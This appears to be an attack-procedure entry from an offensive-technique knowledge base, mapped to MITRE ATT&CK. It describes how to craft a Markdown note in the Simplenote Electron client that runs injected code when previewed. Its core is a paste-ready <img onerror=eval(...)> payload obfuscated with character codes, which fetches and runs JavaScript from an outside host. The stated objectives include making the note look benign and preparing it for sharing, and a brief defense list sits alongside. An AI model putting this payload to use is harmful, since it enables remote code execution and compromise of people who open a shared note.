---
id: proc-craft-malicious-note
tags:
  - xss
  - markdown
  - simplenote
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Desktop
  - Electron
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:36.306Z'
skill_level: beginner
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Craft-Malicious-Markdown-Note-in-Simplenote

## Summary

This procedure creates a Markdown note in Simplenote with an injected <img> tag containing the obfuscated XSS payload, which triggers on preview to load external JS.

## Description

The Simplenote Markdown parser fails to sanitize HTML, allowing <img src=x onerror=...> to inject and execute JS via eval. The note appears benign but executes RCE when previewed.

## Requirements

1. Installed Simplenote Electron client
2. Encoded payload from previous step
3. Simplenote account

## Defense

Defensive measures and detection strategies:

- Sanitize Markdown input to strip scriptable HTML tags
- Disable preview mode or use safe rendering libraries like marked with sanitizer
- Log unusual HTML in notes

## Objectives

1. Inject XSS payload into note
2. Ensure note saves and previews without edit-mode execution
3. Prepare for sharing

## Instructions

### Step 1: Create New Note

**Context**: Open Simplenote and start a new note.

Paste the following content:
```markdown
## Test Note
### HackerOne Windows RCE PoC - pops "netplwiz"
<img src=x onerror=eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59))>
```

> Save the note. Expected: No errors; HTML visible in edit mode.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- markdown
